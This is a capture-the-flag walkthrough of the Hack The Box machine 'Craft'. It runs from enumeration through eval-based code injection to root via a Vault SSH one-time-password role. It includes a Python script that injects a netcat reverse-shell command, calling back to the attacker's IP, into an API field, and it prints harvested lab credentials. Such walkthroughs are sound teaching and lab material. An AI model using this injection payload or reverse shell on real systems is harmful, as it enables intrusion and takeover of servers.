<center><h1>Craft</h1></center>
<br>
Start with an nmap scan

```
# nmap -sV -sC -T4 -p- 10.10.10.110
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-07 19:26 EST
Nmap scan report for craft.htb (10.10.10.110)
Host is up (0.021s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
6022/tcp open  ssh      (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V=7.80%I=7%D=11/7%Time=5DC4B64C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.84 seconds
```
Only a few ports open. I check out port 443. Doing some enumeration on the webpage I found an api and a Gogs webpage but to access them I did have to add two hostnames to my ```/etc/hosts``` file.```api.craft.htb``` and ```gogs.craft.htb```.
<br><br>
Doing some enumeration around the Github page I found some credentials for the user ```dinesh``` in one of the commits he did located here ```https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86```. Below is the python program that has the credentials. I will be using this code soon..
```
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.

print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = '15.0'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)


# create a sample brew with real ABV... should succeed.
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = '0.15'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```
A little more digging will reveal another commit to ```brew.py``` where they fixed an issue in the api where you could ad bogus ABV values. Taking a closer look at ```brew.py``` reveals something interesting. 
<br><br>
The part the handles the ABV value is a python eval function. This tells me that if I can figure out a way to pass some input to that then I could get a shell on the system.
```
if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
else:
    create_brew(request.json)
    return None, 201
```
Now the python script from earlier does exactly that. It generates an api token for us and then sends a POST request to create a new brew and in that request is the ABV value which we can modify in the python script with a reverse shell. I removed some of the excess code.
```
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('ebachman', 'llJ77D8QFkLPQB'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)

brew_dict = {}
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.39 9999 >/tmp/f')"
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
```
I set up my listener and then ran the python script and got a reverse shell
```
# nc -lvnp 9999
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.110.
Ncat: Connection from 10.10.10.110:43285.
/bin/sh: can't access tty; job control turned off
/opt/app # 
```
First thing I did was run a ```whoami``` and when I saw I was root I thought I was done. Soon I releaized that was not the case when I went to grab the user and root flags but both of them were not there. I was confused so I ran ```LinEnum.sh``` to see if it would find anything and sure enough it finds that I am in a Docker Container. I spent a while trying to figure out how to break out of the docker container with no luck and realized this was most likely not the solution and looked elsewhere. I went back to the github page and saw the ```dbtest.py``` script that interacts with the sql database so it gave me the idea to do the same with my own python script. First I wrote one to list all of the tables in the database and there was a ```user``` database and then I wrote another one to read the contents of that table. I used a python SimpleHTTPServer to copy the files over to the box. The credentials I got from the table are below
```
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```
I tried to ssh in using some of the new credentials but that did not work so I went back to the Github page and tried to log in with the new credentials and I could as the user ```gilfoyle```. Right away I see he has a private github repo and in there he has some ssh keys. I grab the private key and download it and use that to ssh into the box as the user ```gilfoyle```
```
# ssh -i id_rsa gilfoyle@10.10.10.110
```
It asks for a password so I enter the password for I got from the SQL database ```ZEU3N8WNM2rh4T```.
```
Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov  7 17:54:03 2019 from 10.10.14.39
gilfoyle@craft:~$
```
I can now read the ```user.txt``` file
```
gilfoyle@craft:~$ cat user.txt 
bbf4b0cadfa3d4e***************
```
Running ```ls -la``` in gilfoyles ```/home``` directory will reveal an interesting file named ```.vault-token```.
```
gilfoyle@craft:~$ ls -la
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Nov  7 17:55 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo
```
Going back to the github repo will reveal a ```Vault``` folder and inside is a ```secrets.sh``` script.
```
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```
After reading the documentation on vault and how it works I figured out that is the steup for a one time password generator. Basically I can trigger it to generate a password for that can be used to ssh in as the user root.
<br><br>
I generate a password using the command below. The password is the ```key```
```
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110
Key                Value
---                -----
lease_id           ssh/creds/root_otp/d1c4244a-97ee-b2c4-819a-bd09079bde97
lease_duration     768h
lease_renewable    false
ip                 10.10.10.110
key                cb7e3efc-fb76-2295-dd94-ad2c51c219f1
key_type           otp
port               22
username           root
```
Then ssh as the user root and use the key as the password
```
gilfoyle@craft:~$ ssh root@10.10.10.110
The authenticity of host '10.10.10.110 (10.10.10.110)' can't be established.
ECDSA key fingerprint is SHA256:sFjoHo6ersU0f0BTzabUkFYHOr6hBzWsSK0MK5dwYAw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.110' (ECDSA) to the list of known hosts.


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 04:53:14 2019
root@craft:~# 
```
From here I can read the ```root.txt``` file
```
root@craft:~# cat root.txt 
831d64ef54d92c1**************
```
<br><br><br><br>
